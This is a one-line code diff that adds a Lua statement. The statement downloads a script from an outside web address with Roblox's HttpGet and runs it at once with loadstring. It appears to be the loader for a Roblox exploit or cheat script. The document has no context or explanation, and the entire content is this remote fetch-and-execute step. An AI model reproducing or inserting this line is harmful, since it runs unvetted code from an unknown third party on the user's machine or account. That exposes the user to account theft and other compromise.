@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://btteam.net/scripts-auth/', true))()
